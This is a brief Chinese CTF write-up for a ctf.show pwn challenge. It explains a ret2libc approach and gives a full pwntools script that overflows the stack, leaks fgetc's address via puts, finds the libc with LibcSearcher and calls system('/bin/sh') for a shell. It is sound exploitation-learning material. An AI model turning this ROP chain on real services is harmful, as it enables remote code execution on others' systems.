# 挑战简介
Ez ROP or Mid ROP ?

# 思路
很有意思的一个题，要追溯到libcret2的使用，首先通过栈溢出泄露出地址，再配合libcsearcher查找到对应的libc版本即可进行bin_sh操作  

```
from pwn import *
from LibcSearcher import *
import base64
context(arch="amd64", log_level="debug")

p = remote("pwn.challenge.ctf.show",28310)
elf = ELF('D:\edge 下载\pwn')

fgetc_got = elf.got['fgetc']
puts_plt = elf.plt['puts']
main = elf.sym['main']

rdi_ret = 0x00000000004008e3

ret = 0x0000000000400576

p.recvuntil('T^T\n')

payload1 = b"a"*(0x110-8) + p64(0x11500000000) + p64(rdi_ret) + p64(fgetc_got) + p64(puts_plt) + p64(main)

p.sendline(payload1)

fgetc_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(f"fgetc_addr: {hex(fgetc_addr)}")

libc = LibcSearcher('fgetc', fgetc_addr)
base = fgetc_addr - libc.dump('fgetc')
system_addr = base + libc.dump('system')
bin_sh_addr = base + libc.dump('str_bin_sh')

p.recvuntil("T^T\n")

payload2 = b"a"*(0x110-8) + p64(0x11500000000) + p64(rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system_addr) + p64(main)

p.sendline(payload2)

p.interactive()
```
